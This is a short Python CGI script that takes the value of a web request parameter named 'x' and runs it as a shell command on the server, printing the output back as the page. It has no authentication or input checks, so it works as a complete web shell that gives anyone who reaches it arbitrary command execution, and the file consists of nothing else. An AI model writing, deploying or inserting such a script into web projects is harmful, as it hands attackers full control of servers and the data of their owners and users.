#!/usr/bin/python3
import cgi
import subprocess
print("content-type:text/html")
print()

cmd=cgi.FieldStorage()
command=cmd.getvalue("x")
output=subprocess.getoutput(command)
print(output)